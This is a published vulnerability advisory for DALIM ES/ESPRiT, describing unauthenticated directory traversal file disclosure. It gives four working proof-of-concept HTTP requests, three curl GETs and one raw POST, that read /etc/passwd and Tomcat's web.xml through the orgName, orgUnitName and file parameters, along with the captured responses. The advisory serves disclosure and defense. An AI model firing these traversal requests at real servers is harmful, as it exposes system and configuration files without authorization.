@@ -1,0 +1,210 @@
+DALIM SOFTWARE ES Core 5.0 build 7184.1 Multiple Remote File Disclosures
+
+
+Vendor: Dalim Software GmbH
+Product web page: https://www.dalim.com
+Affected version: ES/ESPRiT 5.0 (build 7184.1)
+                                (build 7163.2)
+                                (build 7163.0)
+                                (build 7135.0)
+                                (build 7114.1)
+                                (build 7114.0)
+                                (build 7093.1)
+                                (build 7093.0)
+                                (build 7072.0)
+                                (build 7051.3)
+                                (build 7051.1)
+                                (build 7030.0)
+                                (build 7009.0)
+                                (build 6347.0)
+                                (build 6326.0)
+                                (build 6305.1)
+                                (build 6235.9)
+                                (build 6172.1)
+                  ES/ESPRiT 4.5 (build 6326.0)
+                                (build 6144.2)
+                                (build 5180.2)
+                                (build 5096.0)
+                                (build 4314.3)
+                                (build 4314.0)
+                                (build 4146.4)
+                                (build 3308.3)
+                  ES/ESPRiT 4.0 (build 4202.0)
+                                (build 4132.1)
+                                (build 2235.0)
+                  ES/ESPRiT 3.0
+
+Summary: ES is the new Enterprise Solution from DALIM SOFTWARE built
+from the successful TWIST, DIALOGUE and MISTRAL product lines. The ES
+Core is the engine that can handle project tracking, JDF device workflow,
+dynamic user interface building, volume management. Each ES installation
+will have different features, depending on the license installed: online
+approval, prepress workflow, project tracking, imposition management...
+
+ES is a collaborative digital asset production and management platform,
+offering services ranging from online approval to web-based production
+environment for all participants of the production cycle, including brand
+owners, agencies, publishers, pre-media, printers and multichannel service
+provider. ES lets users plan, execute and control any aspect of media
+production, regardless of the final use of the output (print, web, ebook,
+movie, and others). It ensures productivity and longterm profitability.
+
+Desc: Input passed thru several parameters is not properly verified before
+being used to read files. This can be exploited by an unauthenticated 
+attacker to read arbitrary files from local resources with directory
+traversal attacks.
+
+Tested on: Red Hat Enterprise Linux Server release 7.3 (Maipo)
+           CentOS 7
+           Apache Tomcat/7.0.78
+           Apache Tomcat/7.0.67
+           Apache Tomcat/7.0.42
+           Apache Tomcat/6.0.35
+           Apache-Coyote/1.1
+           Java/1.7.0_80
+           Java/1.6.0_21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5427
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5427.php
+
+
+15.06.2017
+
+--
+
+
+---------------------------------------------------
+1. PoC request for Password.jsp, orgName parameter:
+---------------------------------------------------
+
+~ curl -v http://TARGET:8080/Esprit/public/Password.jsp\?orgName\=../../../../../../../../../etc/passwd
+*   Trying TARGET...
+* TCP_NODELAY set
+* Connected to TARGET (TARGET) port 8080 (#0)
+> GET /Esprit/public/Password.jsp?orgName=../../../../../../../../../etc/passwd HTTP/1.1
+> Host: TARGET:8080
+> User-Agent: curl/7.51.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Content-Type: text/html;charset=UTF-8
+< Transfer-Encoding: chunked
+< Date: Thu, 15 Jun 2017 02:18:44 GMT
+< Server: Server
+< 
+
+--snip--
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+--snip--
+
+
+----------------------------------------------------
+2. PoC request for Login.jsp, orgUnitName parameter:
+----------------------------------------------------
+
+~ curl -v http://TARGET/Esprit/ES/Login\?orgUnitName\=../../../../../../../../../etc/passwd
+*   Trying TARGET...
+* TCP_NODELAY set
+* Connected to TARGET (TARGET) port 80 (#0)
+> GET /Esprit/ES/Login?orgUnitName=../../../../../../../../../etc/passwd HTTP/1.1
+> Host: TARGET
+> User-Agent: curl/7.51.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 15 Jun 2017 02:19:31 GMT
+< Server: Server
+< Content-Type: text/html;charset=UTF-8
+< Set-Cookie: JSESSIONID=0ECF83AA0D337B5D942B5C164B172051; Path=/Esprit; HttpOnly
+< Transfer-Encoding: chunked
+< 
+
+--snip--
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+--snip--
+
+
+---------------------------------------
+3. PoC request for log, file parameter:
+---------------------------------------
+
+~ curl http://TARGET:8080/dalimws/log\?file\=../../../../../../../etc/passwd\&len\=10000\&download\=true -v
+*   Trying TARGET...
+* TCP_NODELAY set
+* Connected to TARGET (TARGET) port 8080 (#0)
+> GET /dalimws/log?file=../../../../../../../etc/passwd&len=10000&download=true HTTP/1.1
+> Host: TARGET:8080
+> User-Agent: curl/7.51.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Content-Disposition: attachment; filename=../../../../../../../etc/passwd
+< Content-Type: text/plain
+< Content-Length: 10000
+< Date: Thu, 15 Jun 2017 02:20:17 GMT
+< Server: Server
+< 
+
+--snip--
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+--snip--
+
+
+---------------------------------------
+4. PoC request for log, file parameter:
+---------------------------------------
+
+POST /dalimws/log HTTP/1.1
+Host: TARGET:8080
+Content-Length: 116
+User-Agent: H2O
+Content-type: application/x-www-form-urlencoded
+Accept: */*
+Accept-Language: en-US,en;q=0.8,mk;q=0.6
+Connection: close
+
+file=../../../../../../../symlnks/common/tomcat7.0/conf/web.xml&len=1000000&XUI_SessionID=LOGReq&responseWiter=XML
+
+Response:
+
+--snip--
+    <!-- The mapping for the default servlet -->
+    <servlet-mapping>
+        <servlet-name>default</servlet-name>
+        <url-pattern>/</url-pattern>
+    </servlet-mapping>
+
+    <!-- The mappings for the JSP servlet -->
+    <servlet-mapping>
+        <servlet-name>jsp</servlet-name>
+        <url-pattern>*.jsp</url-pattern>
+        <url-pattern>*.jspx</url-pattern>
+    </servlet-mapping>
+--snip--
